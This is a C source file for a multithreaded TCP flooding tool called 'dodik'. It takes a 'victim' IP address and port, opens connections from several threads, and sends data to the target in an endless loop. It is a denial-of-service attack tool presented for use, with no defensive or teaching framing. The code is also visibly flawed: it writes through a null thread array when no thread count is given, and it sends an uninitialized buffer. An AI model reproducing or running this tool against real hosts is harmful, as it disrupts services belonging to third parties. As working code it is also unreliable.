#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

struct data {
	char const *ip;
	char const *port;
	int timeout;
};

void *threadSend(void *args);

int main(int const argc, char const **argv)
{
	if (argc < 6) {
		printf("\nError: too few arguments\n");
		printf("\nUsage: dodik [opt1] [value1] [opt2] [value2] ... \n\n");
		printf("Option\tDescription\n");
		printf("  -i  \t(MUST BE) Victim's IP-address\n");
		printf("  -p  \t(MUST BE) Victim's IP-port\n");
		printf("  -t  \t(optional) Count threads; def.val.=1\n");
		printf("  -s  \t(optional) Interval between sending packages; def.val.=0\n\n");
		exit(EXIT_FAILURE);
	}
	
	// Declaring variables
	int count_threads = 0;
	pthread_t *thread_arr = NULL;
	struct data args = {0};
	args.ip = NULL;
	args.port = NULL;
	args.timeout = 0;
	count_threads = 1;
	
	// Argument handling
	for (int i = 1; i <= argc - 1; i += 2) {
		if (strcmp(argv[i], "-i") == 0)
			args.ip = argv[i + 1];
		else if (strcmp(argv[i], "-p") == 0)
			args.port = argv[i + 1];
		else if (strcmp(argv[i], "-t") == 0) {
			free(thread_arr);
			count_threads = atoi(argv[i + 1]);
			thread_arr = (pthread_t *)malloc(sizeof(pthread_t) * count_threads);
		}
		else if (strcmp(argv[i], "-s") == 0)
			args.timeout = atoi(argv[i + 1]);
	}

	// Checking must haves variables
	if (args.ip == NULL || args.port == NULL) {
		if (args.ip == NULL)
			printf("Error: you didn't enter IP-address\n");
		if (args.port == NULL)
			printf("Error: you didn't enter port\n");
		free(thread_arr);
		exit(EXIT_FAILURE);
	}

	// Creating threads
	for (int i = 0; i < count_threads; i++)
		pthread_create(thread_arr + i, NULL, threadSend, (void *) &args);

	// Launch threads
	for (int i = 0; i < count_threads; i++)
		pthread_join(thread_arr[i], NULL);
	
	free(thread_arr); // freeing allocated memory
	
	return 0;
}

void *threadSend(void *args)
{
	char const *ip = ((struct data*) args)->ip;
	char const *port = ((struct data*) args)->port;
	int timeout = ((struct data*) args)->timeout;
	
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in address = {0};
	address.sin_family = AF_INET;
	inet_pton(AF_INET, ip, &address.sin_addr);
	address.sin_port = htons(atoi(port));
	
	connect(sock, (struct sockaddr *) &address, sizeof(address));

	char buf[64];
	while (1) {
		send(sock, buf, 64, 0);
		usleep(timeout * 1000000);
	}
}